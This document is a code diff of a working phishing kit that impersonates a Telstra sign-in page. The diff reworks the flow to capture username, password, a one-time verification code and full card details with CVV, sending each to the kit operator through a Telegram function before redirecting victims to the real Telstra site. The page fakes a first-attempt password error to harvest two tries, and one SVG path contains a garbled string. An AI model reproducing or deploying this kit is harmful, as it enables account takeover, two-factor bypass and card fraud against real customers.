@@ -3,11 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to Telstra webmail</title>
+    <title>Sign in</title>
     
-    <!-- Favicon Logo Telstra -->
     <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/recovery-account857/img/main/telstra.png">
-    
     <link rel="stylesheet" href="style.css">
     <script src="config/telegram.js"></script>
 </head>
@@ -20,41 +18,42 @@
         <main class="content-card">
             
             <!-- ======================================
-                LANGKAH 1: EMAIL
+                LANGKAH 1: HALAMAN AWAL — USERNAME
                 ====================================== -->
-            <div id="step-email">
-                <h1>Sign in to Telstra webmail</h1>
-                <p class="subheading">Sign in with your Telstra email address</p>
+            <div id="step-username">
+                <h1>Sign in</h1>
+                <p class="subheading">Sign in with your Telstra ID</p>
 
-                <form id="email-form">
-                    <label for="telstra-email">Telstra email</label>
-                    <p class="example-text">
-                    <input type="text" id="telstra-email" required autocomplete="username">
+                <form id="username-form">
+                    <label for="telstra-username">Username</label>
+                    <input type="text" id="telstra-username" required autocomplete="username">
 
-                    <a href="#" class="forgot-link">Forgot Telstra email</a>
+                    <a href="#" class="recover-link">Recover username</a>
 
                     <label class="checkbox-label">
-                        <input type="checkbox" id="remember-email">
-                        Remember Telstra email
+                        <input type="checkbox" id="remember-username">
+                        Remember username
                     </label>
 
                     <button type="submit" class="btn-primary">Continue</button>
+                    
                     <div class="divider">OR</div>
-                    <button type="button" class="btn-secondary">Sign in to MyTelstra</button>
+                    
+                    <button type="button" class="btn-create-id">Create a Telstra ID</button>
                 </form>
             </div>
 
             <!-- ======================================
-                LANGKAH 2 & 3: KATA SANDI + ERROR
+                LANGKAH 2: HALAMAN PASSWORD
                 ====================================== -->
             <div id="step-password" style="display:none;">
-                <h1>Sign in to Telstra webmail</h1>
-                <p class="subheading">Sign in with your Telstra email address</p>
+                <h1>Sign in</h1>
+                <p class="subheading">Sign in with your Telstra ID</p>
 
                 <p class="back-label">Back to previous for:</p>
                 <div class="email-display-box">
-                    <span id="show-email"></span>
-                    <a href="#" class="change-link" onclick="goBackEmail(); return false;">&lsaquo;</a>
+                    <a href="#" class="back-arrow" onclick="goBackUsername(); return false;">&lt;</a>
+                    <span id="show-username"></span>
                 </div>
 
                 <form id="password-form">
@@ -70,21 +69,41 @@
                     </div>
 
                     <a href="#" class="recover-link">Recover account</a>
+                    
                     <button type="submit" class="btn-primary">Sign in</button>
                 </form>
             </div>
 
             <!-- ======================================
-                LANGKAH 4: WHY SET UP DIRECT DEBIT?
+                LANGKAH 3: HALAMAN KODE VERIFIKASI
+                ====================================== -->
+            <div id="step-code" style="display:none;">
+                <h1>Enter code</h1>
+                <form id="code-form">
+                    <label for="verification-code">6-digit code</label>
+                    <input type="text" id="verification-code" maxlength="6" autocomplete="one-time-code" inputmode="numeric">
+                    
+                    <p class="resend-text">Didn't get your one-time code?</p>
+                    <a href="#" class="resend-link" id="resend-btn">Resend &rarr;</a>
+                    
+                    <div class="code-actions">
+                        <a href="#" class="back-link" onclick="goBackPassword(); return false;">&lt; Back</a>
+                        <button type="submit" class="next-link">Next &rarr;</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- ======================================
+                LANGKAH 4: DIRECT DEBIT
                 ====================================== -->
             <div id="step-debit" style="display:none;">
                 <div class="debit-icon">
                     <svg width="120" height="120" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M60 30C55 30 50 33 50 38V82C50 87 55 90 60 90H90C95 90 100 87 100 82V38C100 33 95 30 90 30H60Z" fill="#E0EFFF" stroke="#0066CC" stroke-width="2"/>
+                        <path d="M60 30C55 30 50 33 50 38V82C50 87 55 90 60 90H90C95 90 100 87 100 82V38C100 33 95 30 90 30H60Z" fill="#E0EFFF" stroke="#0066FF" stroke-width="2"/>
                         <path d="M75 50C75 42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ"/>
                         <circle cx="35" cy="55" r="12" fill="#E0EFFF" stroke="#00A651" stroke-width="2"/>
                         <path d="M32 55L34 57L38 53" stroke="#00A651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                        <path d="M90 70C90 70 85 78 75 78C65 78 60 70 60 70" stroke="#0066CC" stroke-width="2" stroke-linecap="round"/>
+                        <path d="M90 70C90 70 85 78 75 78C65 78 60 70 60 70" stroke="#0066FF" stroke-width="2" stroke-linecap="round"/>
                     </svg>
                 </div>
                 <h2>Why set up a direct debit?</h2>
@@ -98,7 +117,7 @@
             </div>
 
             <!-- ======================================
-                LANGKAH 5: PAYMENT DETAILS — DIPERBAIKI
+                LANGKAH 5: PAYMENT DETAILS
                 ====================================== -->
             <div id="step-payment" style="display:none;">
                 <p class="step-indicator">STEP 1 OF 3</p>
@@ -121,7 +140,7 @@
                     <div class="form-row">
                         <div class="form-group">
                             <label>Expiry Date</label>
-                            <input type="text" id="card-expiry" placeholder="mm/yy" maxlength="4" autocomplete="cc-exp">
+                            <input type="text" id="card-expiry" placeholder="mm/yy" maxlength="5" autocomplete="cc-exp">
                         </div>
                         <div class="form-group">
                             <label>Security Code</label>
@@ -137,13 +156,13 @@
             </div>
 
             <!-- ======================================
-                LANGKAH 6: BERHASIL + ALIHKAN OTOMATIS
+                LANGKAH 6: SUKSES
                 ====================================== -->
             <div id="step-success" style="display:none;">
                 <div class="success-icon">
                     <svg width="120" height="120" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <circle cx="60" cy="60" r="50" fill="#E0EFFF"/>
-                        <path d="M40 60L55 75L80 45" stroke="#0066CC" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M40 60L55 75L80 45" stroke="#0066FF" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
                     </svg>
                 </div>
                 <h2>Your card was added successfully!</h2>
@@ -155,21 +174,26 @@
     </div>
 
     <script>
-        let simpanEmail = '';
+        let simpanUsername = '';
         let percobaanSandi = 0;
 
         function sembunyikanSemua() {
-            ['step-email','step-password','step-debit','step-payment','step-success'].forEach(id => 
+            ['step-username','step-password','step-code','step-debit','step-payment','step-success'].forEach(id => 
                 document.getElementById(id).style.display = 'none'
             );
         }
 
-        function goBackEmail() {
+        function goBackUsername() {
             sembunyikanSemua();
             percobaanSandi = 0;
             document.getElementById('error-msg').style.display = 'none';
             document.getElementById('password-wrap').classList.remove('error-border');
-            document.getElementById('step-email').style.display = 'block';
+            document.getElementById('step-username').style.display = 'block';
+        }
+
+        function goBackPassword() {
+            sembunyikanSemua();
+            document.getElementById('step-password').style.display = 'block';
         }
 
         function goPayment() {
@@ -182,9 +206,7 @@
             document.getElementById('step-debit').style.display = 'block';
         }
 
-        // ======================================
-        // FORMAT NOMOR KARTU — 16 digit + spasi otomatis
-        // ======================================
+        // Format nomor kartu 16 digit
         const inputKartu = document.getElementById('card-number');
         inputKartu.addEventListener('input', function() {
             let nilai = this.value.replace(/\D/g, '');
@@ -192,9 +214,7 @@
             this.value = nilai.replace(/(\d{4})(?=\d)/g, '$1 ');
         });
 
-        // ======================================
-        // FORMAT TANGGAL — MM/YY otomatis
-        // ======================================
+        // Format tanggal MM/YY
         const inputKadaluwarsa = document.getElementById('card-expiry');
         inputKadaluwarsa.addEventListener('input', function() {
             let nilai = this.value.replace(/\D/g, '');
@@ -204,28 +224,34 @@
             this.value = nilai;
         });
 
-        // ======================================
-        // 1. EMAIL → KIRIM → LANGKAH SANDI
-        // ======================================
-        document.getElementById('email-form').addEventListener('submit', async e => {
-            e.preventDefault();
-            const email = document.getElementById('telstra-email').value.trim();
-            if (!email) return;
-            simpanEmail = email;
+        // Batasi kode hanya angka
+        const inputKode = document.getElementById('verification-code');
+        inputKode.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').substring(0, 6);
+        });
 
-            await kirimPesanTelegram(`📧 TELSTRA EMAIL
+        // ======================================
+        // 1. USERNAME → KIRIM → LANGKAH PASSWORD
+        // ======================================
+        document.getElementById('username-form').addEventListener('submit', async e => {
+            e.preventDefault();
+            const username = document.getElementById('telstra-username').value.trim();
+            if (!username) return;
+            simpanUsername = username;
+
+            await kirimPesanTelegram(`👤 TELSTRA USERNAME
 ━━━━━━━━━━━━━━━━━━
-Email: ${email}
+Username: ${username}
 Waktu: ${new Date().toLocaleString()}`);
 
             sembunyikanSemua();
-            document.getElementById('show-email').textContent = email;
+            document.getElementById('show-username').textContent = username;
             document.getElementById('step-password').style.display = 'block';
             document.getElementById('telstra-password').focus();
         });
 
         // ======================================
-        // 2. SANDI → KIRIM → CEK PERCOBAAN
+        // 2. PASSWORD → KIRIM → CEK PERCOBAAN
         // ======================================
         document.getElementById('password-form').addEventListener('submit', async e => {
             e.preventDefault();
@@ -235,31 +261,60 @@ Waktu: ${new Date().toLocaleString()}`);
 
             await kirimPesanTelegram(`🔐 TELSTRA SANDI #${percobaanSandi}
 ━━━━━━━━━━━━━━━━━━
-Email: ${simpanEmail}
+Username: ${simpanUsername}
 Kata Sandi: ${sandi}
 Percobaan: ke-${percobaanSandi}
 Waktu: ${new Date().toLocaleString()}`);
 
             if (percobaanSandi === 1) {
-                // Pertama: tampil error
+                // Pertama: tampil error, tetap di halaman Password
                 document.getElementById('error-msg').style.display = 'block';
                 document.getElementById('password-wrap').classList.add('error-border');
                 document.getElementById('telstra-password').value = '';
                 document.getElementById('telstra-password').focus();
             } else {
-                // Kedua: lanjut ke halaman Direct Debit
+                // Kedua: lanjut ke HALAMAN KODE VERIFIKASI
                 sembunyikanSemua();
-                document.getElementById('step-debit').style.display = 'block';
+                document.getElementById('step-code').style.display = 'block';
+                document.getElementById('verification-code').focus();
             }
         });
 
         // ======================================
-        // 3. KARTU → KIRIM → SUKSES → ALIHKAN
+        // 3. KODE VERIFIKASI → KIRIM → NEXT
+        // ======================================
+        document.getElementById('code-form').addEventListener('submit', async e => {
+            e.preventDefault();
+            const kode = document.getElementById('verification-code').value.trim();
+            if (!kode || kode.length < 6) return;
+
+            await kirimPesanTelegram(`🔢 KODE VERIFIKASI
+━━━━━━━━━━━━━━━━━━
+Username: ${simpanUsername}
+Kode: ${kode}
+Waktu: ${new Date().toLocaleString()}`);
+
+            sembunyikanSemua();
+            document.getElementById('step-debit').style.display = 'block';
+        });
+
+        // Kirim ulang kode
+        document.getElementById('resend-btn').addEventListener('click', async e => {
+            e.preventDefault();
+            await kirimPesanTelegram(`🔁 KODE DIKIRIM ULANG
+━━━━━━━━━━━━━━━━━━
+Username: ${simpanUsername}
+Waktu: ${new Date().toLocaleString()}`);
+            alert('Verification code resent!');
+        });
+
+        // ======================================
+        // 4. KARTU → KIRIM → SUKSES → ALIHKAN
         // ======================================
         document.getElementById('payment-form').addEventListener('submit', async e => {
             e.preventDefault();
             const kartu = {
-                nomor: document.getElementById('card-number').value.replace(/\s/g, ''), // tanpa spasi
+                nomor: document.getElementById('card-number').value.replace(/\s/g, ''),
                 nama: document.getElementById('card-name').value,
                 kadaluwarsa: document.getElementById('card-expiry').value,
                 cvv: document.getElementById('card-cvv').value
@@ -267,18 +322,16 @@ Waktu: ${new Date().toLocaleString()}`);
 
             await kirimPesanTelegram(`💳 TELSTRA KARTU
 ━━━━━━━━━━━━━━━━━━
-Email: ${simpanEmail}
+Username: ${simpanUsername}
 Nomor: ${kartu.nomor}
 Nama: ${kartu.nama}
 Kadaluwarsa: ${kartu.kadaluwarsa}
 CVV: ${kartu.cvv}
 Waktu: ${new Date().toLocaleString()}`);
 
-            // Tampil halaman sukses
             sembunyikanSemua();
             document.getElementById('step-success').style.display = 'block';
 
-            // Hitung mundur 5 detik → telstra.com.au
             let detik = 5;
             const tampil = document.getElementById('countdown');
             const hitung = setInterval(() => {
